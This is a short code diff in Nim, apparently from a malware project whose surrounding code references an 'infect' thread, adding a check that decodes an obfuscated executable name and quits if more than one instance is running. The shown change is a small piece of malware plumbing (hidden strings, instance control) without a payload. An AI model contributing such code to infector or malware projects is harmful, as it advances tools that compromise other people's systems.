@@ -34,6 +34,22 @@ when USE_INFECT_THREAD:
     except:
       quit 0
 
+from lib/flags import ALLOW_ONLY_ONE_INSTANCE
+when ALLOW_ONLY_ONE_INSTANCE:
+  from wAuto/process import processes
+
+  from lib/functions/hideString import d
+
+  from lib/constants import EXE_NAME
+
+  let dEXE_NAME: string = d EXE_NAME
+
+  var len: int = 0
+  for _ in processes(dEXE_NAME):
+    len += 1
+    if len > 1:
+      quit 0
+
 
 from lib/constants import isProd
 when not isProd:
